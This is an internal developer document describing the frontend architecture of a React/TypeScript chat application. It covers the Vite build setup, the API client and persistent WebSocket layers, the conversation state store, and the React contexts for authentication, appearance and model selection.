# Frontend Architecture

This document describes the frontend architecture for the React-based chat interface, including the development environment, build tooling, API client layer, UI components, state management, and authentication.

## Overview

The frontend is a modern single-page application built with:
- React 19 for the UI framework
- TypeScript for type safety
- Vite as the build tool (production builds only; no dev server)

## Technology Stack

React 19, TypeScript, Vite 7, React Router DOM 7, Lucide React (icon library), pdfjs-dist (in-browser PDF rendering, pinned to an exact version so the bundled worker can never mismatch the main-thread library), and ESLint. All versions and dependencies are defined in `frontend/package.json`.

## Vite Configuration

The build environment is configured in `frontend/vite.config.ts`.

### Key Configuration Points

1. **Build Configuration**
   - `outDir: 'dist'`: Build output goes to `frontend/dist/`
   - `sourcemap: true`: Generates source maps for debugging production builds
   - `base: '/'`: Sets the base path for all assets (matches backend route at root)

2. **Self-Hosted pdf.js Assets**
   - `vite-plugin-static-copy` copies the pdfjs-dist `cmaps`, `standard_fonts`, `wasm`, and `iccs` directories from `node_modules` into `dist/assets/pdfjs/` (a `rename: { stripBase: 2 }` drops the leading `node_modules/pdfjs-dist` path segments)
   - The pdf.js worker is bundled separately via a Vite `?url` import in `frontend/src/components/PdfViewer.tsx`, landing in `dist/assets/`
   - The deployment has no network egress, so none of these assets can come from a CDN; they must also live under `/assets/` because the FastAPI server only serves multi-segment static paths under the `/assets` mount (see `quest.py`)

3. **Theme Override PostCSS Plugin** (`frontend/themeOverridePlugin.ts`, registered under `css.postcss.plugins`)
   - Backs the Settings > Appearance light / dark / auto selector. Component stylesheets theme themselves with plain `@media (prefers-color-scheme: light)` blocks, and a media query cannot be overridden from JavaScript, so instead of rewriting every stylesheet the plugin rewrites each such block at build time into two copies:
     - the original media block with every selector scoped to `:root:not([data-theme="dark"])` (auto mode keeps following the OS; a forced dark theme suppresses the light overrides)
     - plus an unwrapped copy scoped to `:root[data-theme="light"]` (a forced light theme applies them regardless of the OS)
   - `prefers-color-scheme: dark` blocks are handled symmetrically; compound queries such as `(max-width: 768px) and (prefers-color-scheme: light)` keep their remaining clauses
   - Scoping goes through `:where()`, which has zero specificity, so the rewritten rules keep the specificity and source order of the originals and the cascade is unchanged; `:root`/`html` selectors get the qualifier on the root itself. Media query lists (comma-separated) are left untouched with a build warning
   - New stylesheets keep writing ordinary `prefers-color-scheme` blocks (or, better, use the design tokens); nothing needs to reference `data-theme` directly

The frontend is built with `npm run build` and the resulting static files are served by FastAPI. There is no Vite dev server; all development and production use the same build-and-serve workflow via `run.py`.

## TypeScript Types

All TypeScript interfaces for API interactions are defined in `frontend/src/api/types.ts`. Key types include `ConversationDetail` (with optional `project_id` for URL redirect plus `last_message_seq` for the persistent-WS subscribe), `StreamEvent` (persistent-WS event types with discriminator), `MessageContent` (union type for all message content), and `WebSocketSendMessage` (outbound `send_message` payload). See the file directly for the full set of type definitions.

## Build and Serving

The frontend is always built with `npm run build` and served as static files by FastAPI. Both development and production use the same workflow.

### Build Process

When running `npm run build`:

1. **TypeScript Compilation** with strict checking
   - `tsc -b` type-checks both referenced projects (`tsconfig.app.json` for `src/`, `tsconfig.node.json` for the Vite/Vitest configuration and the PostCSS plugin), no emit
   - Build fails if type errors exist

2. **Vite Build** creates optimized bundles
   - JavaScript minified and tree-shaken
   - CSS extracted and minified
   - Assets hashed for cache busting
   - Output to `frontend/dist/`

3. **Backend Serving**
   - FastAPI serves static files from `frontend/dist/`
   - All requests to `/` serve the React app
   - API requests go to `/app/api/*` endpoints

## Integration with Backend

### API Communication

The frontend communicates with the backend via:

1. **REST API** for CRUD operations and user management (conversations, memories, guides, action requests, settings, connectors, auth -- see `frontend/src/api/client.ts` for all functions and `frontend/src/api/config.ts` for endpoint URL builders)

2. **WebSocket** -- a single persistent multiplexed socket (`/app/api/stream`) per browser session that carries every realtime signal: subscribe / catchup / resync, send_message / stop, durable `message_appended`, transient text deltas / sub-agent events, and per-user globals (request count, conversation list, wait-handle resolved). See [Realtime Architecture](realtime.md)

### Request Routing

Since the frontend is served by FastAPI on the same origin, all API and WebSocket requests are same-origin with no proxy needed:

```
Browser: fetch('/app/api/conversations')  →  FastAPI Backend
Browser: new WebSocket('ws://localhost:8000/app/api/...')  →  FastAPI Backend
```

## API Client Layer

The API client layer bridges the frontend to the backend, providing type-safe, well-abstracted methods for interacting with the chat API.

### Architecture Overview

```
React Components
       ↓
   checkSession() ──────→ GET /app/api/me (session cookie auth)
       ↓
   persistentWebSocket ──→ WS /app/api/stream (multiplexed, cookie auth, single per session)
       ↓
   API Client functions ──→ REST API (conversations, tail, credentials: 'include')
       ↓
   endpoints (config.ts) ──→ URL building
```

### Implemented Modules

#### 1. API Configuration (`src/api/config.ts`)

Centralized configuration for API endpoints and URL building:

The `endpoints` object in `frontend/src/api/config.ts` provides centralized URL builders for all API endpoints: `conversations()`, `conversation(id)`, `persistentStream()` (the `WS /app/api/stream` endpoint), `settings()`, `me()`, `memories()`, `memory(id)`, `guides()`, `guide(id)`, `conversationLoadedSkills(conversationId)`, `actionRequestsCount()`, and `version()`.

**Features**:
- Centralized endpoint management
- Automatic WebSocket URL protocol detection (ws:// vs wss://)
- Type-safe URL builders
- Proper URL encoding for query parameters

#### 2. REST API Client (`src/api/client.ts`)

Type-safe wrapper around fetch API for REST endpoints:

Every function is a single call to the shared `apiGet`/`apiPost`/`apiPut`/`apiDelete` wrapper in `src/api/request.ts` (cookie auth via `credentials: 'include'`, JSON body/query helpers, `nullOn` for optional-row 404s). All API functions throw `ApiClientError` (defined in `src/api/request.ts`, re-exported from `client.ts`) with `statusCode`, `errorCode`, `stacktrace`, and `details` fields, normalized from both the flat `{error, message}` and FastAPI `{detail: ...}` error shapes. See [API Client Usage](../api/api-client-usage.md) and the file directly for the full set of functions.

#### 3. Persistent WebSocket (`src/services/PersistentWebSocket.ts`)

Singleton client for `WS /app/api/stream`. Owns connect / reconnect / heartbeat / watchdog / per-conversation subscription-refresh timers (every 3 min while a conversation is in the `subscribed` set, against the 5-min server TTL) and exposes `subscribe(id)` / `unsubscribe(id)` / `send(payload)` / `onGlobalEvent(handler)` / `onConversationEvent(id, handler)` / `setLastSeq(id, seq)` / `getLastSeq(id)`. See [Realtime Architecture](realtime.md).

#### 4. Authentication Utilities (`src/utils/auth.ts`)

Session-based authentication utility. `checkSession()` calls `GET /app/api/me` with `credentials: 'include'` and returns user info if authenticated, `null` otherwise. The frontend authenticates entirely via the session cookie (`COOKIE_NAME` from `auth/config.py`, environment-dependent).

### Error Handling

All REST functions throw `ApiClientError` (defined in `frontend/src/api/types.ts`) with `statusCode`, `errorCode`, and `stacktrace` fields. The persistent WebSocket surfaces backend errors as `{type: "error", code, error}` envelopes (custom 4xxx codes from `chat/realtime/socket.py`); see [Realtime Architecture](realtime.md).

### API Client Summary

The API client layer provides:
- REST endpoint wrappers (cookie-authenticated via `credentials: 'include'`), including `fetchConversationTail(id, afterSeq)` for the persistent-WS catchup / resync flow
- The `persistentWebSocket` singleton (single multiplexed socket per browser session)
- Session check utility (`checkSession()`)
- Extended TypeScript types for API responses
- Comprehensive error handling

## State Management Architecture

The frontend uses a centralized state management architecture that separates per-conversation state from UI state. This enables seamless conversation switching during streaming and prevents bugs where messages route to the wrong conversation.

### Overview

```
User sends message
       ↓
useConversation hook → WebSocketManager.sendMessage()
       ↓
WebSocketManager → persistentWebSocket.send({op:"send_message", ...}) on the singleton WS
       ↓
Server runs run_conversation_turn(); flush callback writes chat_history.json + publishes message_appended
       ↓
PersistentWebSocket routes events to conversation handlers (per-conversation) or global handlers (per-user)
       ↓
WebSocketManager translates transient events into conversationStore[conversationId] streamingMessages;
useConversation REST-fetches the new tail on each message_appended for in-place reconciliation
       ↓
conversationStore notifies subscribers → React re-renders if viewing that conversation
```

**Key benefit**: Messages route to the correct conversation regardless of which conversation is currently visible in the UI.

### Conversation Store (`src/store/conversationStore.ts`)

Observable store that holds per-conversation state using a Map keyed by conversation ID.

**State Interface**:
- `messages`: Array of loaded messages from API
- `isStreaming`: Whether a response is currently streaming
- `partialResponse`: Accumulated text during streaming
- `streamingMessages`: Structured messages (tool_use, tool_result, stats, action_request) during streaming
- `error`: Current error message (if any)
- `stacktrace`: Error stack trace (if available)
- `isLoaded`: Whether conversation has been loaded from API
- `isLoading`: Whether conversation is currently loading
- `subAgentToolCalls`: Map of sub-agent tool calls keyed by parent tool ID (`Map<string, SubAgentToolCallInfo[]>`)
- `subAgentReturned`: Per-parent-tool, per-agent terminal state (`Map<parentToolId, Map<agentName, SubAgentFinishedInfo>>`). Populated by `sub_agent_finished` events (live or hydrated from persistence) and drives the `COMPLETED` / `ERRORED` per-row and outer-group badges in `ToolUseMessage`. Independent of whether the last inner `tool_result` has arrived -- a sub-agent that has returned its last tool result but has not yet called `agent_task_response` still renders as `RUNNING`
- `contextTokens`: Current context window usage in tokens (`number | null`), updated from stats events
- `maxContextTokens`: Maximum context window size for the model (`number | null`), updated from stats events

**Key Methods**:
- `getConversation(id)`: Get state for a conversation (creates default if not exists)
- `updateConversation(id, update)`: Update state for a conversation
- `setMessages(id, messages)`: Set messages after loading from API
- `addMessage(id, message)`: Add a single message (e.g., user input)
- `insertMessagesBySeq(id, messages)`: Merge server-stamped messages into `messages` at their `seq`-determined position, deduping against existing seqs and keeping non-seq'd optimistic placeholders at the tail. Used by both the `message_appended` tail-fetch path and the catchup-mode subscribe response so racing fetches stay in disk order. A same-seq incoming row replaces an existing `synthetic` entry in place, preserving array index / React key / DOM identity
- `finalizeStreamingTextInPlace(id, seq)`: On the primary tab, synthesises a `synthetic: true` persisted text entry at the event's `seq` from the current `partialResponse` and clears `partialResponse` in a single store update, so the streaming bubble keeps its DOM slot through the tail-fetch. No-op when `partialResponse` is empty (tool boundaries) or when the same seq is already present (tail-fetch won the race). The synthetic is replaced in place when the canonical row arrives via `insertMessagesBySeq`
- `startStreaming(id)`: Begin streaming state
- `endStreaming(id, finalMessages)`: End streaming and append final messages
- `addSubAgentToolUse(id, parentToolId, info)`: Add a sub-agent tool call entry to the `subAgentToolCalls` map under the given parent tool ID
- `updateSubAgentToolResult(id, parentToolId, toolId, result)`: Update an existing sub-agent tool call entry with its result, matching by `toolId`
- `markSubAgentFinished(id, parentToolId, agentName, status, error?)`: Record a `sub_agent_finished` event in the `subAgentReturned` map. `status` is `"success"` or `"error"`; the optional `error` string is surfaced as the hover tooltip on the `ERRORED` badge
- `clearSubAgentToolCalls(id)`: Clear both `subAgentToolCalls` and `subAgentReturned` for a conversation (called when streaming ends)
- `setContextUsage(id, contextTokens, maxContextTokens)`: Update context window usage for a conversation from stats events (used by WebSocketManager during streaming and useConversation on historical message hydration)
- `subscribe(listener)`: Subscribe to store changes (for useSyncExternalStore)
- `getSnapshot()`: Get global version number for change detection
- `getConversationSnapshot(id)`: Get the state reference for a specific conversation. Unlike `getSnapshot()`, this returns a per-conversation object reference that only changes when that conversation is updated, allowing `useSyncExternalStore` consumers to skip re-renders caused by unrelated conversations

**Design Decisions**:
- Uses a version number (`snapshotVersion`) for efficient change detection with `useSyncExternalStore`
- `getConversationSnapshot(id)` returns per-conversation state references so that hooks watching a single conversation skip re-renders caused by updates to other conversations. This is the primary mechanism for preventing cross-conversation render cascades
- Creates default state on-demand to avoid null checks
- Separates streaming messages from loaded messages until stream completes

### WebSocket Manager (`src/services/WebSocketManager.ts`)

Thin compatibility shim over the `persistentWebSocket` singleton. After devplan 00062 the manager no longer owns any sockets -- every chat signal rides on the singleton -- but the legacy callback API (`onStreamComplete`, `onConversationRenamed`) and the per-conversation streaming-text bundling still live here so unrelated callers keep working without a sweeping refactor. The earlier `onToolResult` callback (and its `publishToolResult` / `notifyToolResult` plumbing) was always a dead path -- no backend caller drove it -- and was removed when the file browser migrated to subscribing for `file_list_changed` directly on `persistentWebSocket.onGlobalEvent`.

**Responsibilities**:
- Forwards `sendMessage` / `stopStreaming` / `sendConfirmationResult` to `persistentWebSocket.send(...)` (`{op: "send_message"}`, `{op: "stop"}`)
- Tracks every `sendMessage` as a `PendingSend` keyed by the bubble's `client_send_id`: a `send()` that returns `false` (socket closed) or a 15s silence without the server's `send_message_accepted` receipt flips the optimistic bubble into the failed state (`send_failed: "not_connected" | "unconfirmed"`, rendered by `Message.tsx` with Retry / Discard) and tears down the streaming state; `retryFailedSend` re-dispatches the identical envelope, `discardFailedSend` drops the bubble, and a late receipt clears the failure. See [Realtime -- Delivery Receipt and Failed Sends](realtime.md#delivery-receipt-and-failed-sends)
- On per-conversation `text_delta` events, accumulates `responseParts` and syncs the running text into `partialResponse`; bundles the accumulated text into a synthetic `text` message at the next `message_appended` flush boundary so `streamingMessages` stays consistent with the durable record
- On `message_appended` for an assistant text boundary (i.e. while `partialResponse` is non-empty), calls `conversationStore.finalizeStreamingTextInPlace(conversationId, seq)` to swap the streaming bubble for a synthetic persisted entry at the event's seq in a single store update -- this avoids the unmount + remount flash that would otherwise happen during the tail-fetch latency. At tool boundaries (or on subscribed tabs that never accumulated text), this is a no-op and the canonical row inserts normally when the tail-fetch lands
- Routes durable-event types from the persistent WS (`tool_use`, `tool_result`, `action_request`, `stats`, `sub_agent_*`, `conversation_updated`) into the conversation store's `streamingMessages` and updates ancillary state (sub-agent map, context usage)
- Handles `subscription_expired` by clearing the streaming buffer for that conversation, so the next durable `message_appended` boundary triggers a tail fetch and rebuilds canonical state from disk; the singleton's 3-min refresh `setInterval` re-subscribes automatically while the conv stays in the `subscribed` set. See [Realtime -- Subscription TTL](realtime.md#subscription-ttl-and-refresh)
- Notifies `onStreamComplete` listeners when a `send_message_finished` envelope arrives (for sidebar refresh fallback)
- Parses `preview_fields` and `approve_label` from `action_request` messages and stores them alongside the request data
- Emits the local same-tab `emitRequestCountChange()` from `frontend/src/services/requestEvents.ts` when an `action_request` event arrives, so the sidebar badge updates without waiting for the server's `request_count_changed` round-trip
- Requests browser notification permission on the first user-initiated send via `frontend/src/services/desktopNotifications.ts`
- Sends desktop notifications for new action requests and completed responses when the tab is hidden and permission has been granted
- Captures browser timezone and includes it in `send_message` payloads
- Handles `conversation_updated` events by notifying registered `onConversationRenamed` callbacks with the conversation ID and new name

**Key Methods**:
- `sendMessage(conversationId, message, model?, guideId?, skillIds?)`: Forward a `send_message` op to the persistent WS (`guideId` is only set by the routine auto-send path -- guides are deprecated)
- `stopStreaming(conversationId)`: Forward a `stop` op
- `sendConfirmationResult(...)`: Legacy no-op shim retained for callers that have not been swept; current code resolves wait handles via REST (`POST /app/api/wait-handles/{id}/resolve` or `POST /app/api/action-requests/{id}/resolve`)
- `onStreamComplete(callback)`: Register a callback fired on `send_message_finished`
- `onConversationRenamed(callback)`: Register a callback for `conversation_updated` events; used by the Sidebar to update displayed names in real-time

**Timezone Handling**:
When sending a message, the manager automatically captures the browser's timezone using `Intl.DateTimeFormat().resolvedOptions().timeZone` and includes it in the `send_message` payload.

**Model Selection**:
The `sendMessage` method accepts a `model` parameter that specifies which LLM model to use (any registry model ID, e.g. `gemini-3.5-flash-lite`, `gemini-3.6-flash`, `gemini-3.7-flash`, `gemini-3.8-flash`, `claude-haiku-4.5`, `claude-haiku-5-5`, `claude-sonnet-4-6`, `claude-opus-4-6`, `claude-opus-4-7`, `claude-opus-4-8`, `claude-sonnet-5`, `claude-sonnet-5-5`, `claude-opus-5`, or `claude-opus-5-5`; deprecated Gemini models still work for conversations that already use them).

This is included in the `send_message` payload and passed to the backend, which uses the model registry in `chat/llm/config.py` to determine the appropriate provider and route the request accordingly.

After the first message is sent, the conversation's provider is locked (see Provider Locking below), so only models from the same provider can be selected for subsequent messages.

**Desktop Notifications**:
`frontend/src/services/desktopNotifications.ts` wraps the browser Notification API. `WebSocketManager.sendMessage()` calls `requestNotificationPermission()` on user-initiated sends so the permission prompt happens lazily rather than on page load. `sendDesktopNotification()` only fires when the browser supports notifications, permission is `granted`, and `document.hidden` is `true`. Notifications auto-close after 7 seconds, and clicking one focuses the Quest tab.

**Message Handling**:
1. Text chunks accumulated in `responseParts` and synced to `partialResponse`
2. Tool use messages flush accumulated text, then add tool_use to `streamingMessages` (including `intent_message` mapped from `data.intent_message`)
3. Tool results add tool_result to `streamingMessages`
4. Sub-agent tool use messages route to `conversationStore.addSubAgentToolUse()` with `parent_tool_id`, `agent_name`, and the tool call info
5. Sub-agent tool result messages route to `conversationStore.updateSubAgentToolResult()` to pair the result with its corresponding tool use entry
5a. Sub-agent finished messages route to `conversationStore.markSubAgentFinished()` with `parent_tool_id`, `agent_name`, `status`, and optional `error`. This is the canonical "this sub-agent is done" signal from the backend and flips the per-row / group `COMPLETED` / `ERRORED` badge in `ToolUseMessage`
6. Action-request messages add `action_request` to `streamingMessages`, emit `emitRequestCountChange()`, and may trigger a desktop notification using `display_name` (falling back to `request_type`)
7. Conversation-updated messages notify `onConversationRenamed` callbacks with the conversation ID and new `custom_name` (not added to `streamingMessages` -- handled out-of-band for sidebar updates)
8. Stats messages flush accumulated text, then add stats
10. On close, all `streamingMessages` transfer to the main `messages` array, `clearSubAgentToolCalls()` is called; on normal completion (not user-interrupted), the manager may also send a `Quest — Response complete` desktop notification if the tab is hidden

**Stop/Interrupt Handling**:
The `stopStreaming(conversationId)` method sends `{op: "stop", conversation_id}` on the persistent WebSocket to cancel the current model run. The server cancels the in-flight task (if any) and `cancel_pending_wait_handles_for_conversation()` (always); replies `stop_acknowledged` so the UI can clear its spinner immediately; persists an `interrupted` marker if cancel was needed; runs the final flush (which fires `message_appended`); and publishes `send_message_finished` with `interrupted: true`. The frontend displays the interrupted marker with orange indicator styling.

**Important**: Regular socket lifecycle events (page refresh, navigation, network blips) do NOT cancel in-progress work; only an explicit `stop` op does. This allows users to navigate away and return without losing in-progress responses. See [Realtime Architecture](realtime.md) for the full stop semantics.

### Persistent WebSocket Connection Management

`AuthContext.tsx` calls `persistentWebSocket.connect()` once when `isAuthenticated` becomes true and `disconnect()` on logout / account-delete. The socket is shared across every conversation: subscribing to a conversation is `persistentWebSocket.subscribe(id)`.

Subscriptions live until the 5-min server-side TTL expires (the singleton refreshes every 3 min while interested), so the React lifecycle does NOT fire `unsubscribe` on tab switch / unmount -- transient `text_delta` events for the away-conversation still land in the conversation store.

Explicit `persistentWebSocket.unsubscribe(id)` exists for genuine teardown but is not on the lifecycle path. Reconnect / heartbeat / watchdog / subscription refresh are owned by the singleton (see [Realtime Architecture](realtime.md)).

### Application Contexts (`src/contexts/`)

App-wide state is split into one React context per responsibility, composed by `AppProviders.tsx` (App.tsx wraps the routes in `<AppProviders>`). Every provider memoizes its `value`, and because each context holds only one kind of state, a consumer re-renders only when the state it actually reads changes -- a file-browser folder click no longer re-renders the sign-in screen, the composer or the sidebar. There is no umbrella hook: each component imports the hook(s) for the slices it needs (`useAuth()`, `useAppConfig()`, ...). Provider order in `AppProviders` matters only where one provider reads another: `AuthProvider` reads `AppConfigContext`; `AppearanceProvider`, `ProjectsProvider`, `GuidesProvider` and `ConversationModelsProvider` read `AuthContext` (and `ConversationModelsProvider` reads `AppConfigContext`).

| Context (hook) | Owns |
|----------------|------|
| `AppConfigContext.tsx` (`useAppConfig`) | Unauthenticated `GET /app/api/config` state: `appName`, `isDevMode`, `loginRestriction`, `loginMethod`, `passwordSelfService`, `availableModelIds` (+ `getAvailableModelIds()` ref read for async code), `refreshModelCatalog()`; the `whenConfigLoaded` promise other providers await; the `GET /app/api/version` redeploy poll (`updateAvailable`) |
| `AuthContext.tsx` (`useAuth`) | The mount-time session check: `isAuthenticated`, `isCheckingAuth`, `userEmail`, `userName`, `isAdmin`, `enabledFeatures` + `refreshEnabledFeatures()`, `hasPassword`, `googleServicesConnected` / `hasAnyServiceConnected` + `refreshConnectionStatus()`, impersonation fields, and `sessionSnapshot` (the raw `GET /me` payload, set once by the mount-time check so Appearance / ConversationModels can hydrate from it). Also opens the persistent WebSocket when `isAuthenticated` turns true and closes it on sign-out |
| `AppearanceContext.tsx` (`useAppearance`) | `theme` / `setTheme`, `colorTheme` / `setColorTheme` (details below) |
| `NavigationContext.tsx` (`useNavigationState`) | `activeConversationId` (URL mirror), `showRequestsView`, `scrollToMessageIndex`, `isSettingsOpen` / `settingsInitialSection`, and the one-shot hand-offs `pendingRoutineMessage` (Sidebar routine run -> ChatPanel auto-send) and `pendingFirstMessage` (HomeComposer -> ChatPanel first send) |
| `ProjectsContext.tsx` (`useProjects`) | `projects` / `projectsLoaded` / `loadProjects()` (loaded once authenticated), URL-mirrored `activeProjectId`, Sidebar `drilledProjectId` |
| `GuidesContext.tsx` (`useGuides`) | Deprecated guide list `guides` / `guidesLoaded` / `loadGuides()`; fetched only while the `guides` feature gate is on for the user, cleared when it closes |
| `ConversationModelsContext.tsx` (`useConversationModels`) | Default models + per-conversation overrides + provider locks (details below) |
| `ConversationSkillsContext.tsx` (`useConversationSkills`) | Per-conversation queued / loaded skill ids (`get/setQueuedSkillsForConversation`, `get/setLoadedSkillsForConversation`, `markSkillsAsLoaded`) |
| `FileBrowserStateContext.tsx` (`useFileBrowserState`) | Per-conversation file-browser path + history (`getFileBrowserState` / `setFileBrowserState`), used by `useFileBrowser` |

**Boot order.** `AppConfigProvider` fetches the config and the initial version hash on mount and exposes `whenConfigLoaded`. `AuthProvider` runs `checkSession()` concurrently but awaits `whenConfigLoaded` before committing any session state, so `isCheckingAuth` only turns false once `loginMethod` is known (the sign-in screen never flashes the wrong form) and everything hydrated from the session sees the credentialed-model list. `ConversationModelsProvider` hydrates its defaults from `sessionSnapshot` as a render-time state adjustment rather than in an effect, so the first authenticated render already shows the user's stored default instead of the placeholder; `AppearanceProvider` applies the server theme in an effect (the localStorage cache has already set the pre-paint attribute). Unit tests for these boundaries live in `src/contexts/AppProviders.test.tsx` (`npm test`).

**ConversationModelsContext values**:
- `defaultModels` / `defaultModel`: Per-user "last-used" LLM model for new conversations, tracked separately per conversation visibility (`ModelVisibility` in `frontend/src/constants/models.ts`): `private` (`users.settings.default_model`, every conversation outside a public project) and `public` (`users.settings.public_default_model`, public-project conversations, whose admin allow-list differs -- see [Model Selection](model-selection.md)). `defaultModel` is the private one.
  - Sourced only from a fresh `GET /app/api/me` fetch (no localStorage); a stored pick that is unset/unknown/deprecated/disallowed-for-the-visibility/uncredentialed falls through (`resolveDefaultModel` -> `isModelSelectableFor`): the public context tries `public_default_model` then `default_model` (a first public project starts on the user's usual model when the admin allows it there), the private context only `default_model`; the final fallback is `resolveFallbackModel(availableIds, visibility)` -- Opus 4.8 (`DEFAULT_MODEL_ID`) when allowed + credentialed, else the admin's first top-level menu pick for that visibility, else the first offerable model in catalog order (e.g. Gemini 3.5 Flash-Lite on a Gemini-only local instance -- deprecated models are never picked).
  - Credentialed-ness comes from `available_models` on `GET /app/api/config`; resolution awaits the mount-time config fetch, and if that fetch fails the list stays `null` and availability is not checked.
  - Both start at the Opus-4.8 placeholder pre-fetch
- `setDefaultModel(model, visibility?)`: In-memory-only setter reflecting a picker change in the current composer's display. Does NOT write the server default or localStorage
- `refreshDefaultModel(visibility?)`: Async; re-fetches `GET /app/api/me` and re-applies the resolved pick for that visibility (private when omitted). Called on every fresh new-chat composer mount (home composer + new empty per-conversation composer) AND on every private<->public context switch of a mounted composer -- `HomeComposer.tsx` re-runs it when the drilled project's `public` flag changes (drilling into / out of a public project keeps the home composer mounted) and re-seeds the draft-keyed selection with the result, `ChatPanel.tsx` re-runs it for an empty conversation when its asynchronous project fetch flips `isPublicProject` and seeds the conversation-keyed selection; a resolution for the previous context is discarded. Resolves to the resolved model id
- `persistDefaultModel(model, visibility?)`: Best-effort fire-and-forget `PUT /app/api/settings { default_model }` (private) or `{ public_default_model }` (public). The ONLY server write of either key; called exclusively from the two first-send choke points (never on mere picker selection). The home flow carries `isPublicProject` on `pendingFirstMessage` so ChatPanel persists under the right key before its own project fetch resolves
- `setDefaultModel(model, visibility?)`: In-memory-only setter reflecting a picker change in the current composer's display. Does NOT write the server default or localStorage
- `getModelForConversation(conversationId)` / `setModelForConversation(conversationId, model)` / `hydrateModelForConversation(conversationId, model)`: the per-conversation override (`setModelForConversation` PATCHes `/conversations/{id}/model`; `hydrate*` only sets the in-memory value from a server response). Deprecated ids are remapped on read via `DEPRECATED_MODEL_MAP`
- `setDraftModelForConversation(conversationId, model, visibility?)`: Draft-safe model setter for the home composer -- updates the in-memory per-conversation model map (and the visibility's default for display) but does NOT PATCH the server and does NOT persist the user-level default (the draft "conversation" doesn't exist yet; the default is persisted only on first send via `persistDefaultModel`). No localStorage
- `getLockedProvider(conversationId)` / `lockConversationProvider(conversationId, provider)` / `isProviderLocked(conversationId)`: per-conversation provider locks, persisted in localStorage under `quest_locked_providers`. The lazy initializer migrates the pre-rename `praixy_locked_providers` key and strips any legacy `HOME_DRAFT_KEY` entry on load (see Provider Locking under the Model Selector section)

**AppearanceContext values**:
- `theme` / `setTheme`: Settings > Appearance colour scheme (`'light' | 'dark' | 'auto'`, helpers in `frontend/src/utils/theme.ts`).
  - Boots from the `quest_theme` localStorage cache (an inline `<script>` in `frontend/index.html` has already applied it to `<html data-theme>` before the first paint, so a forced scheme never flashes the OS scheme), then re-synced from `theme` on `GET /app/api/me` -- the server value in `users.settings.theme` is the source of truth and follows the user across devices.
  - `setTheme` applies the attribute immediately (auto removes it), updates the cache, and persists via `PUT /app/api/settings { theme }`, rejecting on a failed save so `AppearanceSection.tsx` can show the error while the local choice stays applied.
  - `index.css` also sets `color-scheme: light|dark` on `:root[data-theme]` so native controls and scrollbars match; the media-query side is handled by the build-time theme override plugin (see Vite Configuration)
- `colorTheme` / `setColorTheme`: Settings > Appearance colour theme (`'prototype' | 'electric-blue' | 'alloy' | 'recall'`, registry + helpers in `frontend/src/utils/colorTheme.ts`). Same cycle as `theme`: boots from the `quest_color_theme` localStorage cache (the `index.html` boot script sets `<html data-color-theme>` pre-paint; the default `prototype` is never cached), re-synced from `color_theme` on `GET /app/api/me` (`users.settings.color_theme`, `null` = default), and persisted via `PUT /app/api/settings { color_theme }` (server validates against `COLOR_THEME_CHOICES`, `""` clears). `applyColorTheme` also keeps the `<meta name="theme-color">` in step with the computed `--accent`

**NavigationContext hand-offs**:
- `pendingRoutineMessage` / `setPendingRoutineMessage`: `{ conversationId, prompt, guideId }`, set by the Sidebar when a routine is run and consumed by ChatPanel's auto-send effect
- `pendingFirstMessage` / `setPendingFirstMessage`: First-message carry-forward set by `HomeComposer` and consumed by `ChatPanel`'s auto-send effect (shape `{ conversationId, prompt, model, skillIds, flags, isPublicProject, attachedFilenames, attachments }`); distinct from `pendingRoutineMessage` because it carries model + skillIds + flags, the public-project flag for persisting the right default, the workspace-relative names of files uploaded before the first send, and pasted-image refs (see the HomeComposer first-send flow)

**Automatic behaviors** (by owner):
- `AppConfigContext`: fetches `GET /app/api/config` on mount (unauthenticated) to determine `appName`, `isDevMode`, the sign-in method and the model catalog (`setModelCatalog()` runs before `availableModelIds` is set, since consumers read the module-state catalog during the re-render); fetches the server git hash via `fetchVersion()` on mount (the same `GET /app/api/version` response also carries the release `version`/`tag`/`released`/`commits_since_tag` fields that `AboutSection.tsx` fetches on its own mount -- see [Development Workflows -- Releases](../setup/development-workflows.md#releases)) and polls it every 60 seconds (`VERSION_POLL_INTERVAL_MS`), skipping hidden tabs and checking immediately on `visibilitychange`; when the hash changes, sets `updateAvailable` and stops polling. If the initial fetch fails, the hash ref stays `null` and polling is a no-op
- `AuthContext`: checks the session via `checkSession()` on mount (`GET /app/api/me` with cookie), then stores identity / flags and sets `isAuthenticated`. App.tsx auto-opens the settings modal to Data Connections when `hasAnyServiceConnected` is false -- desktop layout only; the mobile shell never auto-opens settings (its full-screen settings takeover would hijack the first view)
- `ProjectsContext` loads the project list once authenticated; `GuidesContext` loads the guide list while the `guides` gate is on
- `ConversationModelsContext`: hydrates the per-visibility defaults from the session snapshot, re-fetches them on every fresh new-chat composer mount via `refreshDefaultModel` (cross-tab correctness, no localStorage), and persists the chosen model server-side via `persistDefaultModel` (`PUT /app/api/settings`) only on the first send of a new chat. The per-conversation override (`PATCH /conversations/{id}/model`) is separate and unchanged

### useConversation Hook (`src/hooks/useConversation.ts`)

React hook for subscribing to a specific conversation's state.

**Parameters**: `conversationId`

**Return Values**:
- `messages`: Loaded messages for this conversation
- `isStreaming`: Whether streaming is active
- `partialResponse`: Current partial text during streaming
- `streamingMessages`: Structured messages during streaming
- `error`/`stacktrace`: Error state
- `isLoaded`/`isLoading`: Loading state
- `sendMessage(text, model)`: Function to send a message with specified model
- `addUserMessage(text)`: Function to add user message without sending
**Implementation**:
- Uses `useSyncExternalStore` with `getConversationSnapshot(id)` as the snapshot function. Because the snapshot is a per-conversation state reference (not a global version counter), the component only re-renders when its specific conversation's state changes
- Automatically loads conversation from API when conversationId changes
- After `fetchConversation` resolves, records `response.last_message_seq` into `persistentWebSocket.setLastSeq(id, seq)` and calls `persistentWebSocket.subscribe(id)` so the first subscribe op carries a usable `last_seq`. The effect cleanup detaches the per-conversation event handler but does NOT send a wire `unsubscribe` -- the conversation stays subscribed on the server until the TTL lapses, so transient events for an away-conversation are not dropped while the user is briefly elsewhere
- Subscribes to `persistentWebSocket.onConversationEvent(id, ...)` for `message_appended` events; on each event, calls `fetchConversationTail(id, lastKnown - 1)` to hydrate just the new tail and hands the rows to `conversationStore.insertMessagesBySeq` so they land at the seq-ordered position regardless of the resolution order of overlapping tail-fetches. Optimistic user bubbles are reconciled in-place (matching by content + `optimistic: true`) before the seq-ordered insert. On a `subscribed` envelope with `mode: "catchup"` the catchup messages are applied directly via the same `insertMessagesBySeq` path without a refetch; on `mode: "resync"` the conversation is fully refetched
- Prevents re-fetching if already loaded
